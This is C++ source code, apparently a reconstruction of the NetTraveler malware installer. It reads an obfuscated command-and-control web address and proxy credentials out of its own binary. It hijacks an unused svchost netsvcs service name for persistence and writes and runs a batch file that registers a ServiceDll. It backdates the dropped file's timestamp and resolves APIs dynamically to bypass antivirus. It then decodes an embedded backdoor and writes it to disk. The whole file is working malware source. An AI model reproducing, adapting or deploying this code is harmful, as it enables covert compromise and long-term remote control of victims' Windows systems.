// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#include <windows.h>
#include <iostream>

// Functions for AntiVirus bypass
#include "bypass.hpp"

// Plain backdoor
#include "backdoor.hpp"

// ======= [BEGIN EASY COSTUMIZATION] =======
#define CONFIG_FILE_NAME		"config_t.dat"
#define BATCH_FILE_NAME			"net.bat"
#define INSTALL_MUTEX_NAME		" INSTALL SERVICES NOW!"

#define CRYPTO_STRING_KEY		(unsigned char)0x3E
#define CRYPTO_BINARY_KEY		{'j', 'w', 'y', '7'}

#define MAX_BINARY_DATA_LENGTH	200 * 1024					// 200KB

#define DEFAULT_CMD_DOWN_TIME	10
#define DEFAULT_UPLOAD_RATE		128
// ======== [END EASY COSTUMIZATION] ========


void CryptoString(char *szArray, int nLen);
void CryptoBinary(BYTE *bArray, signed int nLen);

BOOL SetupConfig()
{
	CHAR szModuleName[MAX_PATH];
	CHAR szWinDir[MAX_PATH];
	CHAR szWebPage[MAX_PATH];
	CHAR lpBuf128[128];
	CHAR szConfigPath[MAX_PATH];
	CHAR szProxy_IP[32];
	CHAR szProxy_PSW[32];
	CHAR szProxy_USER[32];
	CHAR lpBuf32[32];

	BYTE bAutoCheck		= 0;
	BYTE bUseProxy		= 0;
	
	WORD nProxy_UNK		= 0;
	WORD nProxy_PORT	= 0;
	WORD nDownCmdTime	= 0;
	WORD nUploadRate	= 0;


	// ================== OPEN CONFIG FILE ==================
	GetWindowsDirectory(szWinDir, MAX_PATH);
	sprintf(szConfigPath, "%s\\system\\" CONFIG_FILE_NAME, szWinDir);

	HANDLE hConfig = CreateFile(szConfigPath,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (INVALID_HANDLE_VALUE == hConfig)
		return FALSE;

	CloseHandle(hConfig);


	// ================== RETRIEVE CONFIG ==================
	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	FILE *f = fopen(szModuleName, "rb");
	if (NULL == f)
		return FALSE;

	// ------------------ WEB PAGE ------------------
	memset(lpBuf128, 0, 128);

	fseek(f, 688, 0);
	fread(lpBuf128, 1, 128, f);

	CryptoString(lpBuf128, 128);
	if (0 == strlen(lpBuf128))
		return FALSE;

	memset(szWebPage, 0, MAX_PATH);
	sprintf(szWebPage, "%s", lpBuf128);

	// ------------------ DOWN CMD TIME ------------------
	fseek(f, 816, 0);
	fread(&nDownCmdTime, 1, 2, f);

	if (nDownCmdTime <= 0)
		nDownCmdTime = DEFAULT_CMD_DOWN_TIME;

	// ------------------ UPLOAD RATE ------------------
	fseek(f, 818, 0);
	fread(&nUploadRate, 1, 2, f);

	if (nUploadRate <= 0)
		nUploadRate = DEFAULT_UPLOAD_RATE;

	// ------------------ PROXY ------------------
	fseek(f, 820, 0);
	fread(&bUseProxy, 1, 1, f);

	if (bUseProxy)
	{
		// ------------------ PROXY IP ------------------
		memset(lpBuf32, 0, 32);

		fseek(f, 821, 0);
		fread(lpBuf32, 1, 32, f);

		CryptoString(lpBuf32, 32);
		if(0 == strlen(lpBuf32))
			return FALSE;

		memset(szProxy_IP, 0, 32);
		sprintf(szProxy_IP, "%s", lpBuf32);

		// ------------------ PROXY PORT ------------------
		fseek(f, 853, 0);
		fread(&nProxy_PORT, 1, 2, f);

		if((signed short)nProxy_PORT <= 0)
			return FALSE;

		// ------------------ PROXY USER ------------------
		memset(lpBuf32, 0, 32);

		fseek(f, 855, 0);
		fread(lpBuf32, 1, 32, f);

		CryptoString(lpBuf32, 32);

		memset(szProxy_USER, 0, 32);
		sprintf(szProxy_USER, "%s", lpBuf32);

		// ------------------ PROXY PSW ------------------
		memset(lpBuf32, 0, 32);

		fseek(f, 887, 0);
		fread(lpBuf32, 1, 32, f);

		CryptoString(lpBuf32, 32);

		memset(szProxy_PSW, 0, 32);
		sprintf(szProxy_PSW, "%s", lpBuf32);

		// ------------------ PROXY UNK ------------------
		fseek(f, 919, 0);
		fread(&nProxy_UNK, 1, 2, f);

		if ((signed short)nProxy_UNK < 0)
			return FALSE;
	}

	// ------------------ AUTO CHECK ------------------
	fseek(f, 921, 0);
	fread(&bAutoCheck, 1, 1, f);


	// ================== WRITE CONFIG ==================
	CHAR lpBuf4[4];

	// ------------------ WEB PAGE ------------------
	WritePrivateProfileString("Option", "WebPage", szWebPage, szConfigPath);

	// ------------------ DOWN CMD TIME ------------------
	memset(lpBuf4, 0, 4);
	sprintf(lpBuf4, "%d", nDownCmdTime);
	WritePrivateProfileString("Option", "DownCmdTime", lpBuf4, szConfigPath);

	// ------------------ UPLOAD RATE ------------------
	memset(lpBuf4, 0, 4);
	sprintf(lpBuf4, "%d", nUploadRate);
	WritePrivateProfileString("Option", "UploadRate", lpBuf4, szConfigPath);

	if (bUseProxy)
	{
		// ------------------ USE PROXY ENABLED ------------------
		WritePrivateProfileString("Other", "UP", "1", szConfigPath);

		// ------------------ PROXY IP ------------------
		WritePrivateProfileString("Other", "PS", szProxy_IP, szConfigPath);

		// ------------------ PROXY PORT ------------------
		memset(lpBuf4, 0, 4);
		sprintf(lpBuf4, "%d", nProxy_PORT);
		WritePrivateProfileString("Other", "PP", lpBuf4, szConfigPath);

		// ------------------ PROXY USER ------------------
		WritePrivateProfileString("Other", "PU", szProxy_USER, szConfigPath);

		// ------------------ PROXY PSW ------------------
		WritePrivateProfileString("Other", "PW", szProxy_PSW, szConfigPath);

		// ------------------ PROXY UNK ------------------
		memset(lpBuf4, 0, 4);
		sprintf(lpBuf4, "%d", nProxy_UNK);
		WritePrivateProfileString("Other", "PF", lpBuf4, szConfigPath);
	}
	else
	{
		// ------------------ USE PROXY DISABLED ------------------
		WritePrivateProfileString("Other", "UP", "0", szConfigPath);
	}

	// ------------------ AUTO CHECK ------------------
	WritePrivateProfileString("OtherTwo", "AutoCheck", bAutoCheck ? "1" : "0", szConfigPath);

	return TRUE;
}

void CryptoString(char *szArray, int nLen)
{
	for (int i = 0; i < nLen; ++i)
	{
		BYTE bEnc = szArray[i];
		if (bEnc)
		{
			bEnc ^= CRYPTO_STRING_KEY;
			szArray[i] = bEnc;
		}
	}
}

void Fast_RestartService(LPCSTR lpszServiceName)
{
	SC_HANDLE hServiceMng = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	if (NULL == hServiceMng)
		return;

	SC_HANDLE hService = OpenService(hServiceMng, lpszServiceName, DELETE | SERVICE_START);
	if (NULL == hService)
		return;

	char szStartService[16] = {};
	AV_BYPASS__StartService(szStartService)

	__tStartService lpfnStartService = (__tStartService)GetProcAddress(LoadLibrary("advapi32.dll"), szStartService);
	lpfnStartService(hService, 0, NULL);

	CloseServiceHandle(hService);
	CloseServiceHandle(hServiceMng);
}

void DebugExceptionFilter(PEXCEPTION_POINTERS lpTopLevelExceptionFilter)
{
#ifdef _DEBUG
	CHAR szDebugString[1024];
	PEXCEPTION_RECORD lpRecord = lpTopLevelExceptionFilter->ExceptionRecord;
	PCONTEXT lpContext = lpTopLevelExceptionFilter->ContextRecord;

	_snprintf(szDebugString,
		1024,
		TEXT("Exception: Code %d, Flag %d, addr %p, param %d\n"),
		lpRecord->ExceptionCode,
		lpRecord->ExceptionFlags,
		lpRecord->ExceptionAddress,
		lpRecord->NumberParameters
	);

	OutputDebugString(szDebugString);
#endif // _DEBUG
}

LONG WINAPI TopLevelExceptionFilter(PEXCEPTION_POINTERS lpTopLevelExceptionFilter)
{
	DebugExceptionFilter(lpTopLevelExceptionFilter);
	return EXCEPTION_CONTINUE_SEARCH;
}

char *SetupServiceEnvironment()
{
	//void *lpBuf = alloca(208520); // UNUSED AND UNDELETED VARIABLE!
	//char *szSubKey[32] = "SOFTWARE\\Microsoft\\Windows NT\\"; // OVERFLOW!
	
	char szSubKey[64] = "SOFTWARE\\Microsoft\\Windows NT\\";

	char *lpszServiceName = NULL;
	HKEY phkResult = NULL;
	SC_HANDLE hServiceMng = NULL;
	SC_HANDLE hService = NULL;

	strcat(szSubKey, "\\CurrentVersion\\Svchost");

	try
	{
		// Get active services list
		HKEY hKey = HKEY_LOCAL_MACHINE;
		if (ERROR_SUCCESS != RegOpenKeyEx(hKey, szSubKey, 0, KEY_QUERY_VALUE, &hKey))
			throw 0;

		DWORD dwError;
		DWORD dwType;
		DWORD dwLen = 1024;
		char lpBuf1024[1024];

		dwError = RegQueryValueEx(hKey, "netsvcs", 0, &dwType, (LPBYTE)lpBuf1024, &dwLen);
		RegCloseKey(hKey);

		SetLastError(dwError);
		if (ERROR_SUCCESS != dwError)
			throw 0;

		hServiceMng = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (NULL == hServiceMng)
			throw 0;

		// Look for unused service (%sex.dll) and replace it (?)
		CHAR szSysDir[MAX_PATH];
		GetSystemDirectory(szSysDir, MAX_PATH);

		CHAR szServicePath[MAX_PATH];
		char *i;
		for (i = lpBuf1024; *i; i = strchr(i, '\0') + 1)
		{
			if (strcmp(i, "6to4"))
			{
				char szService[500];
				wsprintf(szService, "SYSTEM\\CurrentControlSet\\Services\\%s", i);

				if (0 == RegOpenKeyEx(HKEY_LOCAL_MACHINE, szService, 0, KEY_QUERY_VALUE, &hKey))
				{
					RegCloseKey(hKey);
				}
				else
				{
					memset(szServicePath, 0, MAX_PATH);
					wsprintf(szServicePath, "%s\\%sex.dll", szSysDir, i);

					DeleteFile(szServicePath);

					if (INVALID_FILE_ATTRIBUTES == GetFileAttributes(szServicePath))
					{
						__tCreateService lpfnCreateService;
						
						AV_BYPASS__CreateService(lpfnCreateService)
						hService = lpfnCreateService(hServiceMng,
							i,
							i,
							SERVICE_ALL_ACCESS ,
							SERVICE_WIN32_SHARE_PROCESS,
							SERVICE_AUTO_START,
							SERVICE_ERROR_NORMAL,
							"%SystemRoot%\\System32\\svchost.exe -k netsvcs",
							NULL,
							NULL,
							NULL,
							NULL,
							NULL
						);
						if (NULL != hService)
							break;
					}
				}
			}
		}

		if (NULL == hService)
			return 0;

		lpszServiceName = (char *)operator new(lstrlen(i) + 1);
		lstrcpy(lpszServiceName, i);

		if (NULL == hService)
			throw 0;

		CloseServiceHandle(hService);
		CloseServiceHandle(hServiceMng);

		// Setup service registry keys
		hKey = HKEY_LOCAL_MACHINE;

		strncpy(lpBuf1024, "SYSTEM\\CurrentControlSet\\Services\\", 1024);
		strncat(lpBuf1024, lpszServiceName, 100);

		if (RegOpenKeyEx(hKey, lpBuf1024, 0, KEY_ALL_ACCESS, &hKey))
			throw 0;

		DWORD dwTypeValue = 288;
		Sleep(10);

		dwError = RegSetValueEx(hKey, "Type", 0, REG_DWORD, (LPBYTE)dwTypeValue, 4);
		SetLastError(dwError);
		if (dwError)
			throw 0;

		dwError = RegCreateKey(hKey, "Parameters", &phkResult);
		SetLastError(dwError);
		if (dwError)
			throw 0;

		// Write the batch file
		FILE *f = fopen(BATCH_FILE_NAME, "w");

		char szBatchRegKeyCMD[512];
		char szBatchCode[1024] = "@echo off\r\n";
		strcat(szBatchCode, "\r\n");
		sprintf(szBatchRegKeyCMD,
			"@reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d %s",
			lpszServiceName,
			szServicePath
		);
		strcat(szBatchCode, szBatchRegKeyCMD);
		strcat(szBatchCode, "\r\n");

		fwrite(szBatchCode, 1, strlen(szBatchCode), f);
		fclose(f);

		Sleep(10);

		// Execute the batch file
		__tWinExec lpfnWinExec;
		
		AV_BYPASS__WinExec(lpfnWinExec)
		lpfnWinExec(BATCH_FILE_NAME, 0);

		RegCloseKey(hKey);
		RegCloseKey(phkResult);

		CloseServiceHandle(hService);
		CloseServiceHandle(hServiceMng);

		if (NULL != lpszServiceName)
		{
			HANDLE hFile = CreateFile(szServicePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (INVALID_HANDLE_VALUE != hFile)
			{
				// Set reliable file time (17/??/09 20:00)
				SYSTEMTIME lpSysTime = {};

				lpSysTime.wYear		= 2009;
				lpSysTime.wDay		= 17;
				lpSysTime.wHour		= 20;
				lpSysTime.wMinute	= 0;

				FILETIME lpFileTime;
				FILETIME lpLocalFileTime;

				SystemTimeToFileTime(&lpSysTime, &lpFileTime);
				LocalFileTimeToFileTime(&lpFileTime, &lpLocalFileTime);

				__tSetFileTime lpfnSetFileTime;
				
				AV_BYPASS__SetFileTime(lpfnSetFileTime)
				lpfnSetFileTime(hFile, &lpLocalFileTime, NULL, &lpLocalFileTime);

				// Write the new executable
				BYTE bPlainBin[MAX_BINARY_DATA_LENGTH] = {};
				DWORD dwWritten = 0;

				// Decode the backdoor
				memcpy(bPlainBin, g_lpBackdoor, sizeof(g_lpBackdoor));
				CryptoBinary(bPlainBin, sizeof(g_lpBackdoor));

				char szWriteFile[16] = {};
				AV_BYPASS__WriteFile(szWriteFile)

				Sleep(10);

				__tWriteFile lpfnWriteFile = (__tWriteFile)GetProcAddress(LoadLibrary("kernel32.dll"), szWriteFile);
				lpfnWriteFile(hFile, bPlainBin, MAX_BINARY_DATA_LENGTH, &dwWritten, NULL);

				CloseHandle(hFile);
			}
		}
	}
	catch (int e)
	{
#ifdef _DEBUG
		char szDebugLog[1024];

		_snprintf(szDebugLog, 1024, TEXT("%s: Try failed with error code #%d\n"), __FUNCTION__, e);
		OutputDebugString(szDebugLog);
#endif // _DEBUG
	}

	return lpszServiceName;
}

void CryptoBinary(BYTE *bArray, signed int nLen)
{
	BYTE abKey[4] = CRYPTO_BINARY_KEY;
	for (int i = 0; i < nLen; ++i)
	{
		DWORD dw = i % nLen;
		BYTE b1 = (BYTE)(dw ^ (dw >> 8) ^ (BYTE)((dw >> 16) ^ abKey[i & 3]));
		BYTE b2 = bArray[i];

		if (0 != b2 && b2 != b1)
			bArray[i] = b1 ^ b2;
	}
}

int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	// Check for another NetTraveler already running
	HANDLE hInstallMutex = CreateMutex(NULL, TRUE, INSTALL_MUTEX_NAME);
	if (ERROR_ALREADY_EXISTS == GetLastError() || ERROR_ACCESS_DENIED == GetLastError())
		return 0;

	if (FALSE == ReleaseMutex(hInstallMutex))
		return 0;

	CloseHandle(hInstallMutex);

	if (FALSE == SetupConfig())
		return 0;

	// Change the exection filter
	SetUnhandledExceptionFilter(TopLevelExceptionFilter);

	// Setup the environment of the service a start it
	const char *lpszServiceName = SetupServiceEnvironment();

	Sleep(2000);
	DeleteFile(BATCH_FILE_NAME);

	if (NULL == lpszServiceName)
		return 0;

	Fast_RestartService(lpszServiceName);

	// Write the service name
	CHAR szWinDir[MAX_PATH];
	CHAR szFileConf[MAX_PATH];

	GetWindowsDirectory(szWinDir, MAX_PATH);
	wsprintf(szFileConf, "%s\\system\\" CONFIG_FILE_NAME, szWinDir);

	Sleep(10);
	WritePrivateProfileString("Option", "ServiceName", lpszServiceName, szFileConf);

	delete lpszServiceName;
	return 0;
}